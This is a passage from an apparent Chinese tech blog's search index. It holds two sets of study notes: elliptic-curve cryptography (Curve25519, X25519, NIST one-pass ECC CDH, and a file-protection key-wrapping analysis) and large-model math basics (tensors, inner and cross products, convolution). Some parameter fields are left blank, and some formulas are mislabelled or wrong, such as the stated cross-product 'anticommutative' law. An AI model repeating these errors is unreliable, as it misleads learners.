Cryptography）是一种基于有限域上椭圆曲线的公开密钥加密算法。<br>与 RSA 加密算法相比，ECC的主要优势是使用较小的密钥长度并提供相当等级的安全性，另一个优势是可以定义群之间的双线性映射，基于 Weil 对或是 Tate 对；双线性映射已经在密码学中发现了大量的应用，例如基于身份的加密。</p>\n<p>椭圆曲线在密码学中的使用是在1985年由 Neal Koblitz 和 Victor Miller 分别独立提出的。椭圆曲线密码学的算法是在2004年至2005年开始广泛应用。<br>目前主要有两种有限域在 ECC 中被广泛应用，分别基于素数域和伽罗瓦域。</p>\n<h2 id=\"二、基于素数域\"><a href=\"#二、基于素数域\" class=\"headerlink\" title=\"二、基于素数域\"></a>二、基于素数域</h2><p>方程式：$y^2&#x3D;x^3+ax+b \\mod p$<br>参数格式：$(p,a,b,G,n,h)$，其中$G$</p>\n<ul>\n<li>以素数为模的整数域: $\\mathbb {F} _{p}$在通用处理器上计算很快</li>\n<li>以 2 的幂为模的整数域: $\\mathbb {F} _{2^{m}}$当使用专用硬件时，计算速度很快</li>\n</ul>\n<h2 id=\"三、基于伽罗瓦域\"><a href=\"#三、基于伽罗瓦域\" class=\"headerlink\" title=\"三、基于伽罗瓦域\"></a>三、基于伽罗瓦域</h2><ul>\n<li>基于伽罗瓦域的形式：$y^2+xy&#x3D;x^3+ax^2+1$<br>  曲线的参数格式：$(m,f(x),a,b,G,n,h)$，对应不同的$GF(2^m)$域</li>\n</ul>\n<p>蒙哥马利曲线（Montgomery curve）是另一种形式的椭圆曲线，方程如下：<br>$by^2 &#x3D; x^3 + ax^2 + x$</p>\n<p><img src=\"/2022/11/28/%E5%9F%BA%E4%BA%8E%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E7%9A%84ECC%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E7%B3%BB%E7%BB%9F/ecc.jpg\" alt=\"ECC\"></p>\n<p>RFC 7748 收录了两种蒙哥马利曲线，分别是 Curve25519 和 Curve448。<br>Curve25519 是蒙哥马利曲线形式的一个实例， 声称是最快的 Diffie-Hellman 密钥交换函数，由 Daniel J. Bernstein 在2005年设计，提供128比特位安全性，并未被任何已知专利所涵盖。<br>Curve448 是 Mike Hamburg 在 2015 年设计的新曲线, 旨在提供 224 比特的安全性。<br>RFC 7748 同时给出了基于两条椭圆曲线的仅依赖 x 坐标的 ECDH 密钥交换协议 X25519 和 X448.</p>\n<p>$(q,FR,a,b\\{,SEED\\},G,n,h)$，其中：</p>\n<ul>\n<li>$q$：有限域的阶（元素的个数）。对于素数域，$q&#x3D;p$；对于伽罗瓦域，$q&#x3D;2^m$</li>\n<li>$FR$：域表示。对于素数域，$FR$为空；对于伽罗瓦域，$q&#x3D;2^m$</li>\n<li>$a,b$：椭圆曲线方程的参数。</li>\n<li>$SEED$：可选，用于生成和验证a、b以及可能的G(取决于生成方法)的规范过程。</li>\n<li>$G$：生成点。是一个由 a 和 b 确定的点$(G_x,G_y)$。</li>\n<li>$n$：生成点$G$的阶。</li>\n<li>$h$：由$G$生成的循环子群的协因子。</li>\n</ul>\n<p>其中，q为域的阶，FR为域表示，S为种子，a，b为椭圆曲线参数，P为基点，n为点P的阶，h为余因子；</p>\n<p>自 。[17] 从 2014 年开始，OpenSSH[18] 默认为基于 Curve25519 的 ECDH，而 GnuPG 增加了对 Ed25519 密钥的支持，用于签名和加密。[19]2020年，曲线的使用最终在密钥交换和签名方面都实现了标准化。[20][21]</p>\n<p>2017 年，NIST 宣布将 Curve25519 和 Curve448 添加到特别出版物 800-186 中，该出版物指定了供美国联邦政府使用的已批准的椭圆曲线。[22] 两者都在RFC 7748中进行了描述。[23] 2019 年“FIPS 186-5”草案指出，打算允许使用 Ed25519[24] 进行数字签名。2023 年特别出版物 800-186 的更新允许使用 Curve25519。[25]</p>\n<ul>\n<li>椭圆方程：$y^2 &#x3D; x^3 + 486662x^2 + x$，即：a&#x3D;486662，b&#x3D;1</li>\n<li>有限域：$GF(2^{255}-19)$，也是名字中<code>25519</code>的由来</li>\n<li>基点 $x &#x3D; 9$，阶数 $n &#x3D; 2^{252} + 27742317777372353535851937790883648493$</li>\n</ul>\n<p>Curve25519 的构造使其避免了许多潜在的实现缺陷。根据设计，它不受定时攻击的影响，并且它接受任何32字节的字符串作为有效的公钥，并且不需要验证。</p>\n<p>本文重点关注 Curve25519 及相应的密钥交换协议 X25519. Curve25519 是定义在有限域<br>Fp, p &#x3D; 2255 − 19 的蒙哥马利形式椭圆曲线 y<br>2 &#x3D; x<br>3 + 486662x<br>2 + x, 其中曲线上点的个数<br>#E(Fp) &#x3D; 8 · n1, 也即余因子为 8, 并且有<br>n1 &#x3D; 0x1000000000000000000000000000000014def9dea2f79cd65812631a5cf5d3ed,</p>\n<h2 id=\"一次性迪菲-赫尔曼密钥交换协议\"><a href=\"#一次性迪菲-赫尔曼密钥交换协议\" class=\"headerlink\" title=\"一次性迪菲-赫尔曼密钥交换协议\"></a>一次性迪菲-赫尔曼密钥交换协议</h2><p>一次性迪菲-赫尔曼密钥交换协议（One-Pass Diffie-Hellman Key Agreement），定义在 <a href=\"NIST.SP.800-56Ar2.pdf\">NISP SP 800-56A</a> 的 6.2.2.2 章节，名称为<code>One-Pass Diffie-Hellman, C(1e,1s,ECC CDH) Scheme</code>，含义是：</p>\n<ul>\n<li>密钥交换通过一次性的DH（Diffie-Hellman）协议，C 是指协因子（Cofactor）</li>\n<li>使用了1个临时密钥，1个静态密钥</li>\n<li>加密算法是椭圆曲线加密算法 ECC（Elliptic Curve Cryptography）</li>\n</ul>\n<blockquote>\n<p>DH 协议最初采用 FFC 算法（Finite Field Cryptography，有限域加密），也称为幂等算法，安全强度较低<br>Curve 25519 使用蒙哥马利曲线：$y^2 &#x3D; x^3 + 486662x^2 + x$<br>该曲线定义在由素数定义的素数场的二次扩展上，使用基点x &#x3D; 9<br>这个基点的阶数是</p>\n<p>蒙哥马利曲线（Montgomery curve）是另一种形式的椭圆曲线，方程如下：</p>\n</blockquote>\n<p><img src=\"/2022/11/28/%E5%9F%BA%E4%BA%8E%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E7%9A%84ECC%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E7%B3%BB%E7%BB%9F/onePassECCCDH.png\" alt=\"onePassECCCDH\"></p>\n<p>素数域$p &#x3D; 2^{255}-19$，也是名字中25519的由来。</p>\n<ul>\n<li>$p &#x3D; 2^{255} − 19$</li>\n<li>域空间大小：q &#x3D; </li>\n<li>FR &#x3D;</li>\n<li>参数：a &#x3D; 486662</li>\n<li>参数：b &#x3D; 1</li>\n<li>初始值（可选）：SEED &#x3D; N&#x2F;A</li>\n<li>生成元：G &#x3D; </li>\n<li>辅因子：h &#x3D; 8</li>\n<li></li>\n</ul>\n<p>对于<code>Protected Unless Open</code>的文件保护类型，分析其实现方案是：</p>\n<h3 id=\"1-初始化存储介质的环节\"><a href=\"#1-初始化存储介质的环节\" class=\"headerlink\" title=\"1. 初始化存储介质的环节\"></a>1. 初始化存储介质的环节</h3><ul>\n<li>安全隔区随机生成一对非对称密钥（静态）</li>\n<li>静态私钥就是 Class B Key，包裹后的密文<strong>持久化存储</strong>在系统密钥包</li>\n</ul>\n<h3 id=\"2-（某个）文件创建的环节\"><a href=\"#2-（某个）文件创建的环节\" class=\"headerlink\" title=\"2.（某个）文件创建的环节\"></a>2.（某个）文件创建的环节</h3><ul>\n<li>安全隔区随机生成一个文件独有密钥 per-file key</li>\n<li>安全隔区随机生成一对非对称密钥（临时），封装密钥 &#x3D;（静态私钥，临时公钥），生成 per-file key！</li>\n<li>安全隔区将（临时公钥，per-file key！）发给操作系统</li>\n<li>操作系统创建 cnode 元数据，持久化存储 per-file key!，并增加了一个字段存储临时公钥</li>\n<li>安全隔区将 per-file key 发给 AES 引擎，实现文件内容的加密存储</li>\n</ul>\n<blockquote>\n<p>临时私钥从为被使用？好像没有哪个文档提及其用途</p>\n</blockquote>\n<h3 id=\"3-（重新）打开文件的环节\"><a href=\"#3-（重新）打开文件的环节\" class=\"headerlink\" title=\"3.（重新）打开文件的环节\"></a>3.（重新）打开文件的环节</h3><ul>\n<li>操作系统作从文件元数据中获得（临时公钥，per-file key！），并发送给安全隔区</li>\n<li>安全隔区以 Class B key 作为静态私钥，解封密钥 &#x3D;（静态私钥，临时公钥），将 per-file key！解封为 per-file key</li>\n<li>安全隔区将 per-file key 发给 AES 引擎，实现文件内容的加密读写</li>\n<li>一旦该文件被关闭，安全隔区就在内存中丢弃 per-file key，该文件将无法读写</li>\n</ul>\n<h3 id=\"4-用户重置passcode\"><a href=\"#4-用户重置passcode\" class=\"headerlink\" title=\"4. 用户重置passcode\"></a>4. 用户重置passcode</h3><p>理论上应有如下操作：</p>\n<ol>\n<li>根据新的 passcode 重新执行 KDF 函数，生成新的 Class B key</li>\n<li>找到所有数据保护类型为 Class B 的文件元数据，执行如下循环操作：<ul>\n<li>解封密钥 &#x3D;（旧的静态私钥，临时公钥），将 per-file key！恢复为 per-file key</li>\n<li>封装密钥 &#x3D;（新的静态私钥，临时公钥），将 per-file key 封装为新的 per-file key！</li>\n<li>操作系统接受新的 per-file key！，并持久化存储在元数据 cnode 的 cprotect 字段</li>\n</ul>\n</li>\n<li>循环结束后，将新的 Class B key 持久化存储在系统钥匙包</li>\n</ol>\n<blockquote>\n<p>静态私钥保存在 Class B key，但没有文档提及其用途和持久化存储位置，似乎被丢弃了<br>临时私钥的情况也是类似，而且似乎丢弃了也不影响算法的实现。。。</p>\n</blockquote>\n<p><img src=\"/2022/11/28/%E5%9F%BA%E4%BA%8E%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E7%9A%84ECC%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E7%B3%BB%E7%BB%9F/onePassECCCDH-2.png\" alt=\"onePassECCCDH\"></p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.desmos.com/calculator/ialhd71we3?lang=zh-CN\">一个椭圆曲线的演示图</a></li>\n<li><a href=\"https://www.secg.org/sec2-v2.pdf\">secp256k1标准</a></li>\n<li><a href=\"https://learnblockchain.cn/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%A6\">区块链中的数学 - 系列文章</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"NIST.SP.800-56Ar3.pdf\">基于离散对数的非对称密钥建立方案 - R3</a></li>\n<li><a href=\"NIST.SP.800-56Ar2.pdf\">基于离散对数的非对称密钥建立方案 - R2</a></li>\n<li><a href=\"190902-intro-x25519.pdf\">深入理解 X25519</a></li>\n<li><a href=\"sec1-v1.99.dif\">Elliptic Curve Cryptography - 椭圆曲线密码学</a></li>\n</ul>\n"},{"title":"大模型学习笔记之一：基本知识","url":"/2024/07/30/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/","content":"<p>一般认为，神经网络的三个核心要素是：</p>\n<ol>\n<li>模型结构（Architecture）：这是指神经网络的拓扑结构，包括层数、每层的神经元数量、神经元之间的连接方式等。例如，一个简单的多层感知机（MLP）包含输入层、一个或多个隐藏层以及输出层。</li>\n<li>学习策略（Learning Strategy）：涉及如何选择训练神经网络的方法，包括损失函数的选择、优化算法等。损失函数定义了模型预测与实际结果之间的差异如何计算，而优化算法则用于调整网络的权重以最小化损失函数。</li>\n<li>激活函数（Activation Function）：决定了神经网络如何处理和传递信息。它们通常用于在网络的每个神经元中引入非线性，使得网络能够学习和模拟复杂的函数映射。</li>\n</ol>\n<h2 id=\"一、张量（tensor）\"><a href=\"#一、张量（tensor）\" class=\"headerlink\" title=\"一、张量（tensor）\"></a>一、张量（tensor）</h2><p>张量（Tensor）是一个具有统一数据类型的多维数组，本质就是一组有序的数字。</p>\n<p>张量的阶数（order）也称为维数（dimensions）、模态（modes）或方式（ways）。一个 N 阶张量是 N 个向量空间元素的张量积，每个向量空间都有自己的坐标系。实际上，引入 tensor 的目的就是把向量、矩阵推向更高的维度.</p>\n<p>零阶张量是一个标量（scalar），一阶张量是一个矢量（vector，也称向量），二阶张量是一个矩阵（matrix），三阶或更高阶的张量叫做高阶张量（tensor）。</p>\n<p><img src=\"/2024/07/30/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/tensor.png\" alt=\"tensor\"></p>\n<p>在 PyTorch 中，<code>torch.Tensor</code>是存储和变换数据的主要工具。如果你之前用过 NumPy，你会发现 Tensor 和 NumPy 的多维数组非常类似。然而，Tensor 提供 GPU 计算和自动求梯度等更多功能，这些使 Tensor 数据类型更加适合深度学习。</p>\n<h3 id=\"数学性质\"><a href=\"#数学性质\" class=\"headerlink\" title=\"数学性质\"></a>数学性质</h3><h4 id=\"张量的范数-norm\"><a href=\"#张量的范数-norm\" class=\"headerlink\" title=\"张量的范数 - norm\"></a>张量的范数 - norm</h4><p>张量的范数是其所有元素平方和的平方根，即:</p>\n<p>这类似于矩阵 的 F范数(Frobenius norm).</p>\n<h4 id=\"张量的内积-inner-product\"><a href=\"#张量的内积-inner-product\" class=\"headerlink\" title=\"张量的内积 - inner product\"></a>张量的内积 - inner product</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> tensorflow <span class=\"keyword\">as</span> tf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># There can be an arbitrary number of axes (sometimes called &quot;dimensions&quot;)</span></span><br><span class=\"line\">rank_3_tensor = tf.constant([</span><br><span class=\"line\">  [[<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>],</span><br><span class=\"line\">   [<span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>]],</span><br><span class=\"line\">  [[<span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>],</span><br><span class=\"line\">   [<span class=\"number\">15</span>, <span class=\"number\">16</span>, <span class=\"number\">17</span>, <span class=\"number\">18</span>, <span class=\"number\">19</span>]],</span><br><span class=\"line\">  [[<span class=\"number\">20</span>, <span class=\"number\">21</span>, <span class=\"number\">22</span>, <span class=\"number\">23</span>, <span class=\"number\">24</span>],</span><br><span class=\"line\">   [<span class=\"number\">25</span>, <span class=\"number\">26</span>, <span class=\"number\">27</span>, <span class=\"number\">28</span>, <span class=\"number\">29</span>]],])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(rank_3_tensor)</span><br></pre></td></tr></table></figure>\n\n<p>输出结果如下：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">tf.Tensor(</span><br><span class=\"line\">[[[ 0  1  2  3  4]</span><br><span class=\"line\">  [ 5  6  7  8  9]]</span><br><span class=\"line\"></span><br><span class=\"line\"> [[10 11 12 13 14]</span><br><span class=\"line\">  [15 16 17 18 19]]</span><br><span class=\"line\"></span><br><span class=\"line\"> [[20 21 22 23 24]</span><br><span class=\"line\">  [25 26 27 28 29]]], shape=(3, 2, 5), dtype=int32)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"数学运算\"><a href=\"#数学运算\" class=\"headerlink\" title=\"数学运算\"></a>数学运算</h3><h4 id=\"基本运算\"><a href=\"#基本运算\" class=\"headerlink\" title=\"基本运算\"></a>基本运算</h4><ul>\n<li>torch.add()：加法</li>\n<li>torch.mul()：乘法</li>\n<li>torch.div()：除法</li>\n<li>torch.abs()：tensor内每个元素取绝对值</li>\n<li>torch.round()：tensor内每个元素取整数部分</li>\n<li>torch.frac()：tensor内每个元素取小数部分</li>\n<li>torch.log()：tensor内每个元素取对数</li>\n<li>torch.pow()：tensor内每个元素取幂函数</li>\n<li>torch.exp()：tensor内每个元素取指数</li>\n<li>torch.sigmoid()：tensor内每个元素取sigmoid函数值</li>\n<li>torch.mean()：tensor所有元素的均值</li>\n<li>torch.norm()：tensor所有元素的范数值</li>\n<li>torch.prod()：tensor所有元素积</li>\n<li>torch.sum()：tensor所有元素和</li>\n<li>torch.max()：tensor所有元素最大值</li>\n<li>torch.min()：tensor所有元素最小值</li>\n</ul>\n<p>注意：例如add()这类函数一般都是会返回一直tensor值的，但是add_()这类加了下划线的方法是在tensor的原空间处理的，会覆盖之前的值</p>\n<p>同样也可以是用以下方式直接处理</p>\n<p>加 tensor1 + tensor2；<br>减 tensor1 - tensor2；<br>乘 tensor1 * tensor2；<br>除 tensor1 &#x2F; tensor2；<br>内积 tensor1 @ tensor2；<br>幂运算 tensor1 ** n</p>\n<h4 id=\"线性代数运算\"><a href=\"#线性代数运算\" class=\"headerlink\" title=\"线性代数运算\"></a>线性代数运算</h4><ul>\n<li>torch.dot()：向量内积运算</li>\n<li>torch.mv()：矩阵与向量的乘法</li>\n<li>torch.mm()：矩阵乘法，仅适用二维矩阵；高维的矩阵乘法，使用 torch.matnul()</li>\n<li>torch.eig()：方阵的特征值和特征向量</li>\n<li>torch.inverse()：方阵的逆</li>\n<li>torch.ger()：两个向量的张量积</li>\n</ul>\n<h4 id=\"连接、分片、变形\"><a href=\"#连接、分片、变形\" class=\"headerlink\" title=\"连接、分片、变形\"></a>连接、分片、变形</h4><ul>\n<li>torch.cat()：多个tensor的拼接</li>\n<li>torch.reshape()\\torch.view()：返回一个张量，其数据和元素数量与输入相同，但具有指定的形状</li>\n<li>torch.transpose()\\torch.t()：指定tensor的两个维度进行转置，torch.t()方法只适用与二维tensor</li>\n<li>torch.squeeze()&#x2F;unsqueeze()：tensor对于张量中大小为1的维度的压缩与扩张</li>\n<li>torch.permute()：返回维度排列后的原始张量输入的视图。</li>\n</ul>\n<h2 id=\"二、内积和外积（inner-product-external-product）\"><a href=\"#二、内积和外积（inner-product-external-product）\" class=\"headerlink\" title=\"二、内积和外积（inner product &amp; external product）\"></a>二、内积和外积（inner product &amp; external product）</h2><p>由于历史原因，数学学科和物理学科关于 inner product 和 outer product 两个词汇有着五花八门的翻译。<br>在数学学科，通常翻译成内积和外积，是两个名词的直译。点乘和叉乘是根据运算符号得来的俗称。<br>在物理学科，一般翻译成标积和矢积，表示运算的结果为标量和矢量，高中数学则称之为数量积和向量积。</p>\n<h3 id=\"内积（inner-product）\"><a href=\"#内积（inner-product）\" class=\"headerlink\" title=\"内积（inner product）\"></a>内积（inner product）</h3><p>也称为<strong>点积</strong>（dot product）或<strong>数量积</strong>（scalar product），运算结果是一个<strong>标量</strong>。<br>数学定义为：已知两个向量 $a$, $b$，它们的夹角为 $\\theta$，那么：<br>$$ a \\cdot b &#x3D; |a||b|\\cos \\theta$$</p>\n<p>内积的代数定义，对于任意维数的向量都适用：<br>$$\\vec{a} \\cdot \\vec{b} &#x3D; \\sum_{i&#x3D;1}^{n}a_ib_i&#x3D;a_1b_1+a_2b_2+…+a_nb_n$$</p>\n<p>内积的几何意义：内积 $a \\cdot b$ 等于 $a$ 的模与 $b$ 在 $a$ 方向上的投影的乘积。<br><img src=\"/2024/07/30/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/Scalar-product.gif\" alt=\"inner\"></p>\n<p>在欧几里得几何中，两个向量的笛卡尔坐标的点积被广泛使用。它通常被称为欧几里得空间的内积（或很少称为投影积），是内积的一种特殊情况，尽管它不是可以在欧几里得空间上定义的唯一内积。</p>\n<p>内积满足以下性质：</p>\n<ul>\n<li>满足交换律：$a \\cdot b &#x3D; b \\cdot a$</li>\n<li>满足加法的分配律：$a \\cdot (b+c) &#x3D; a \\cdot b + a \\cdot c$</li>\n<li><strong>不满足结合律</strong>：$(a \\cdot b) \\cdot c$ 和 $a \\cdot (b \\cdot c)$ 均无意义，因为无法定义一个标量和一个向量的运算</li>\n<li>两个非零向量 $a$ 和 $b$是正交的，当且仅当 $a \\cdot b &#x3D; 0$</li>\n</ul>\n<h3 id=\"外积（external-product）\"><a href=\"#外积（external-product）\" class=\"headerlink\" title=\"外积（external product）\"></a>外积（external product）</h3><p>是<strong>三维向量特有</strong>的运算，也称为<strong>叉积</strong>（cross product）或<strong>向量积</strong>（vector product），运算结果是一个<strong>向量</strong>。<br>数学定义为：已知两个向量 $a$, $b$，它们的夹角为 $ \\theta $，那么：<br>$$<br>a \\times b  :&#x3D; |a||b| \\sin \\theta，此时 a \\times b 与 a，b 都垂直，且 a，b，a \\times b 符合右手法则<br>$$</p>\n<p>内积的代数定义，使用拉普拉斯展开：<br>$$<br>\\begin{align*}<br>\\textbf{u} \\times \\textbf{v} &amp;&#x3D;<br>  \\begin{vmatrix}<br>    \\textbf{i} &amp; \\textbf{j} &amp; \\textbf{k} \\\\<br>    u_1 &amp; u_2 &amp; u_3 \\\\<br>    v_1 &amp; v_2 &amp; v_3 \\\\<br>  \\end{vmatrix}<br>&#x3D;  \\begin{vmatrix} u_2 &amp; u_3 \\\\ v_2 &amp; v_3 \\end{vmatrix} \\textbf{i} - \\begin{vmatrix} u_1 &amp; u_3 \\\\ v_1 &amp; v_3 \\end{vmatrix} \\textbf{j} + \\begin{vmatrix} u_1 &amp; u_2 \\\\ v_1 &amp; v_2 \\end{vmatrix} \\textbf{k} \\\\<br>&amp;&#x3D; (u_2v_3-u_3v_2) \\textbf{i} - (u_1v_3-u_3v_1)\\textbf{j} + (u_1v_2 - u_2v_1)\\textbf{k}<br>\\end{align*}<br>$$</p>\n<p>外积的几何意义是：$a \\times b$ 的长度是以 $a,b$ 为邻边的平行四边形的面积，$a \\times b$ 的方向是垂直于$a$，$b$ 的法向量。<br><img src=\"/2024/07/30/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/Cross-product.jpeg\" alt=\"outer\"></p>\n<p>外积满足以下性质：</p>\n<ul>\n<li>$ \\textbf{a} \\times \\textbf{a} &#x3D; \\textbf{0} $</li>\n<li>$ \\textbf{a} \\times \\textbf{0} &#x3D; \\textbf{0} $</li>\n<li>对于两个非零向量 $ \\textbf{a} \\times \\textbf{b} &#x3D; \\textbf{0} $，当且仅当 $ \\textbf{a} $ 平行于 $ \\textbf{b} $</li>\n<li>满足<strong>反交换律</strong>：$ ( \\textbf{a} + \\textbf{b}) \\times \\textbf{c} &#x3D; \\textbf{a} \\times \\textbf{c} + \\textbf{a} \\times \\textbf{c} $，$ \\textbf{a} \\times (\\textbf{b} + \\textbf{c}) &#x3D; \\textbf{a} \\times \\textbf{c} + \\textbf{b} \\times \\textbf{c} $</li>\n</ul>\n<p><img src=\"/2024/07/30/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/Cross-product.gif\" alt=\"outer\"></p>\n<h3 id=\"应用示例\"><a href=\"#应用示例\" class=\"headerlink\" title=\"应用示例\"></a>应用示例</h3><p><img src=\"/2024/07/30/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/product-vs.png\" alt=\"Vs\"></p>\n<p>向量内积在机器学习和深度学习领域具有广泛的应用，例如自然语言处理中判断两个单词的相似度，计算机图形学中判断两个矢量的方向性等：</p>\n<ul>\n<li>如果点积 &gt; 0，则它们的方向基本一致（同义词），数值越大表明<strong>相关性</strong>越强</li>\n<li>如果点积 &#x3D; 0，则他们的方向正交，即在空间上互相垂直，也即是<strong>不相关</strong></li>\n<li>如果点积 &lt; 0，则它们的方向基本相反（反义词），数值越大表明<strong>负相关性</strong>越强</li>\n</ul>\n<p>向量外积在计算机图形学中有广泛的应用，包括计算两个向量之间的夹角、计算两个平面的正交关系、计算三角形和多边形的面积、计算几何形状的表面积和体积、计算光线与物体表面的交叉关系，以及计算物体的旋转和转动等。</p>\n<h2 id=\"三、卷积（convolution）\"><a href=\"#三、卷积（convolution）\" class=\"headerlink\" title=\"三、卷积（convolution）\"></a>三、卷积（convolution）</h2><p>在泛函分析中，卷积（convolution），也称叠积、褶积或旋积，是透过两个函数 $f$ 和 $g$ 生成第三个函数的一种数学算子，表征函数 $f$ 与经过翻转和平移的 $g$ 的乘积函数所围成的曲边梯形的面积。</p>\n<p>卷积其实就是为冲击函数诞生的。“冲击函数”是狄拉克为了解决一些瞬间作用的物理现象而提出的符号，例如在 t 时间内对一物体作用 F 的力，对它进行积分（求面积）就代表了力 F 在时间 t 上的累积效果，也就是<strong>冲量</strong>。<br>换句话说，如果将参加卷积的一个函数看作区间的指示函数，卷积也可以被看作是“移动平均”的推广，在“信号与系统”中得到广泛应用。</p>\n<h3 id=\"数学定义\"><a href=\"#数学定义\" class=\"headerlink\" title=\"数学定义\"></a>数学定义</h3><p>设：$ f(t) $ 和 $ g(t) $ 是在实数 $ R $ 上的两个可积函数，则定义：<br>$$<br>f(t) * g(t) :&#x3D; \\int_{-\\infty}^{\\infty} f(\\tau)g(t-\\tau)d(\\tau)<br>$$</p>\n<p>若为离散情况，就是级数形式了：<br>$$<br>f(n) * g(n) :&#x3D; \\sum_{-\\infty}^{\\infty} f[k]g[n-k]<br>$$</p>\n<p>满足如下性质：</p>\n<ul>\n<li>交换律：$ f * g &#x3D; g * f $</li>\n<li>结合律：$ f * ( g * h) &#x3D; (f * g) * h $</li>\n<li>分配律：$ f * (g + h) &#x3D; f * g + f * h $</li>\n<li>微分有关：$ (f*g)’ &#x3D; f’ *g &#x3D; f *g’ $</li>\n</ul>\n<p><img src=\"/2024/07/30/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/cp1.png\" alt=\"cp1\"><br><img src=\"/2024/07/30/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/cp2.png\" alt=\"cp2\"></p>\n<h3 id=\"应用实例\"><a href=\"#应用实例\" class=\"headerlink\" title=\"应用实例\"></a>应用实例</h3><ul>\n<li>代数中，整数乘法和多项式乘法都是卷积。</li>\n<li>统计学中，加权的滑动平均是一种卷积。</li>\n<li>概率论中，两个统计独立变量X与Y的和的概率密度函数是X与Y的概率密度函数的卷积。</li>\n<li>声学中，回声可以用源声与一个反映各种反射效应的函数的卷积表示。</li>\n<li>物理学中，任何一个线性系统（符合叠加原理）都存在卷积。</li>\n</ul>\n<p>在工程技术中的应用更加重要：</p>\n<ul>\n<li>卷积神经网络，应用了多重级联的卷积核心，它被用于机器视觉和人工智能，尽管在多数情况下实际上用的是互相关而非卷积</li>\n<li>传统计算机图像处理中，用作图像模糊、锐化、边缘检测</li>\n<li>信号处理中，任一个线性系统的输出都可以通过将输入信号与系统函数（系统的冲激响应）做卷积获得</li>\n</ul>\n<hr>\n<h2 id=\"附录：名词解释\"><a href=\"#附录：名词解释\" class=\"headerlink\" title=\"附录：名词解释\"></a>附录：名词解释</h2><h3 id=\"MOE（Mixture-of-Experts，专家混合）模型\"><a href=\"#MOE（Mixture-of-Experts，专家混合）模型\" class=\"headerlink\" title=\"MOE（Mixture of Experts，专家混合）模型\"></a>MOE（Mixture of Experts，专家混合）模型</h3><p>MOE 是一种深度学习架构，它将多个专家（experts）网络组合在一起，并通过一个门控（gating）网络来决定每个输入样本应该由哪个专家网络来处理。每个专家网络通常是一个小型的神经网络，它们专注于学习数据的不同部分或特征。</p>\n<h3 id=\"过拟合-泛化\"><a href=\"#过拟合-泛化\" class=\"headerlink\" title=\"过拟合 &amp; 泛化\"></a>过拟合 &amp; 泛化</h3><h3 id=\"梯度消失、梯度爆炸\"><a href=\"#梯度消失、梯度爆炸\" class=\"headerlink\" title=\"梯度消失、梯度爆炸\"></a>梯度消失、梯度爆炸</h3><h3 id=\"dropout、masked\"><a href=\"#dropout、masked\" class=\"headerlink\" title=\"dropout、masked\"></a>dropout、masked</h3><h3 id=\"超参数\"><a href=\"#超参数\" class=\"headerlink\" title=\"超参数\"></a>超参数</h3><p>学习率（learning rate，例如 10%）也是超参数，可以动态吗？</p>\n<h3 id=\"SVM（Support-Vector-Machine，支持向量机）\"><a href=\"#SVM（Support-Vector-Machine，支持向量机）\" class=\"headerlink\" title=\"SVM（Support Vector Machine，支持向量机）\"></a>SVM（Support Vector Machine，支持向量机）</h3><p>SVM 